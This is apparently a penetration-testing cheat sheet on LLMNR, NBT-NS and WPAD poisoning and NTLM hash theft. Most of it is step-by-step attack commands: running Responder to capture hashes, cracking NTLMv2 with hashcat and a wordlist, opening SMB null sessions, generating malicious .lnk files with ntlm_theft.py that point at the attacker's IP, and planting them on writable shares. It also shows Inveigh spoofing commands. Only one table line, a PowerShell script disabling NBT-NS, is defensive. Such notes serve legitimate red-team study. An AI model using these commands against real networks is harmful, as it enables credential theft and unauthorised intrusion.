## LLMNR (Link-Local Multicast Name Resolution)

## NBT-NS (NetBIOS Name Server)

## WPAD (Web Proxy Auto-Discovery)

### Tools: Responder, Hashcat, ntlm_theft.py, Invoke-Inveigh, Inveighzero https://github.com/Kevin-Robertson/Inveigh

### Github repo: https://github.com/Greenwolf/ntlm_theft

## Steps:

#### 1) sudo responder -I YOUR_INTERFACE

#### 2) Leave it for a bit (average 10 minutes)

#### 3) Offline cracking with hashcat ( hashcat -m 5600 HASHFILE PASSWORDFILE --force )

## NTLM Hash stealing:

#### 1) Connect to SMB ( If you have no credentials, connect via NULL session if it is allowed) smbclient -N \\\\IP_ADDRESS\\

#### 2) Check if you have write access on the share you are connected to.

#### 3) python3 ntlm_theft.py -g all -s OUR_IP -f FOLDER_NAME (Create the malicious payload)

#### 4) sudo responder -I INTERFACE

#### 5) Upload an .lnk file to the writeable share

#### 6) After a few minutes you should have captured the hash of the user that tried to interact with our file

#### 7) Crack with hashcat

### .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6

#### More information:

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `responder -h`                                               | Used to display the usage instructions and various options available in `Responder` from a Linux-based host. |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist. |
| `Import-Module .\Inveigh.ps1`                                | Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`. |
| `(Get-Command Invoke-Inveigh).Parameters`                    | Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host. |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`    | Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |
| `.\Inveigh.exe`                                              | Starts the `C#` implementation of `Inveigh` from a Windows-based host. |
| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.  |


